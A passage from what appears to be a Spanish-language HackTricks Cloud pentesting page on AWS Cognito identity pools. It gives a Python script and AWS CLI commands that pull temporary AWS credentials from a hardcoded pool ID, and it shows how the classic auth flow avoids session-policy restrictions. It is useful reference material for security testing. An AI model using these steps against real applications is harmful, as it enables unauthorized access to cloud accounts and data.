# Pools de identidad de Cognito

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información básica

Con un pool de identidad, tus usuarios pueden **obtener credenciales temporales de AWS para acceder a los servicios de AWS**, como Amazon S3 y DynamoDB. Los pools de identidad admiten usuarios invitados anónimos, así como los siguientes proveedores de identidad que puedes usar para autenticar a los usuarios para los pools de identidad:

* Pools de usuarios de Amazon Cognito
* Inicio de sesión social con Facebook, Google, Inicio de sesión con Amazon y Inicio de sesión con Apple
* Proveedores de OpenID Connect (OIDC)
* Proveedores de identidad SAML
* Identidades autenticadas por el desarrollador

### Cognito Sync

Para generar sesiones de pool de identidad, primero necesitas **generar un ID de identidad**. Este ID de identidad es la **identificación de la sesión de ese usuario**. Estas identificaciones pueden tener hasta 20 conjuntos de datos que pueden almacenar hasta 1 MB de pares clave-valor.

Esto es **útil para mantener información de un usuario** (que siempre usará el mismo ID de identidad).

Además, el servicio **cognito-sync** es el servicio que permite **administrar y sincronizar esta información** (en los conjuntos de datos, enviando información en flujos y mensajes SNS...).

## Accediendo a roles IAM

### No autenticado

Lo único que un atacante necesita saber para **obtener credenciales de AWS** en una aplicación Cognito como usuario no autenticado es el **ID del pool de identidad**, y este **ID debe estar codificado en el código fuente** de la aplicación web/móvil para que lo use. Un ID se ve así: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (no se puede obtener por fuerza bruta).

{% hint style="success" %}
El **rol IAM Cognito no autenticado creado a través de** se llama por defecto `Cognito_<nombre del pool de identidad>Unauth_Role`
{% endhint %}

Si encuentras un ID de pool de identidad codificado en el código fuente y permite usuarios no autenticados, puedes obtener credenciales de AWS con:

```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
    print(f"Not valid id: {id_pool_id}")
    exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```

O puedes usar los siguientes **comandos de aws cli**:

```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```

{% hint style="warning" %}
Ten en cuenta que por defecto un usuario de cognito **no autenticado NO puede tener ningún permiso, incluso si se le asignó mediante una política**. Revisa la siguiente sección.
{% endhint %}

### Flujo de autenticación mejorado vs básico

La sección anterior siguió el **flujo de autenticación mejorado predeterminado**. Este flujo establece una **política de sesión restrictiva** [**session policy**](../../aws-basic-information/#session-policies) para la sesión de rol IAM generada. Esta política solo permitirá que la sesión [**use los servicios de esta lista**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (incluso si el rol tenía acceso a otros servicios).

Sin embargo, hay una forma de evitar esto, si el **pool de identidad tiene habilitado el "Flujo básico (clásico)"**, el usuario podrá obtener una sesión usando ese flujo que **no tendrá esa política de sesión restrictiva**.

{% code overflow="wrap" %}
```bash
# Obtener ID de autenticación
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Obtener token de inicio de sesión
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Usar el token de inicio de sesión para obtener credenciales de sesión IAM
## Si no conoces el role_arn, usa el flujo mejorado anterior para obtenerlo
aws sts assume-role-with-web-identity --role-arn <role_arn> --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Si recibes este **error**, es porque el **flujo básico no está habilitado (predeterminado)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Teniendo un conjunto de credenciales IAM, debes verificar [a qué tienes acceso](../../#whoami) y tratar de [escalar privilegios](../../aws-privilege-escalation/).

### Autenticado

{% hint style="info" %}
Recuerda que es probable que a los **usuarios autenticados** se les otorguen **permisos diferentes**, así que si puedes **registrarte dentro de la aplicación**, intenta hacerlo y obtener las nuevas credenciales.
{% endhint %}

También podría haber **roles** disponibles para **usuarios autenticados que acceden al pool de identidad**.

Para esto, es posible que necesites tener acceso al **proveedor de identidad**. Si ese es un **